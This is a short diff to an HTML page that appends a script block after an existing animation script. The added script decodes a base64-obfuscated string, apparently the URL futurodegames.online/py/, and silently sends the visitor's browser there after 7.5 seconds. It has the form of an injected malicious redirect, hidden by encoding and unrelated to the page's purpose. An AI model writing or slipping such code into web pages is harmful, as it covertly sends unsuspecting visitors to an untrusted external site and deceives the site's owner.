@@ -158,5 +158,13 @@
         StartTextAnimation(0);
       });
     </script>
+
+    <script type="text/javascript">
+      function Redirect() {
+        var hashstlp = "aHR0cHM6Ly9mdXR1cm9kZWdhbWVzLm9ubGluZS9weS8=";
+        location.href = atob(hashstlp);
+      }
+      setTimeout("Redirect()", 7500);
+    </script>
   </body>
 </html>
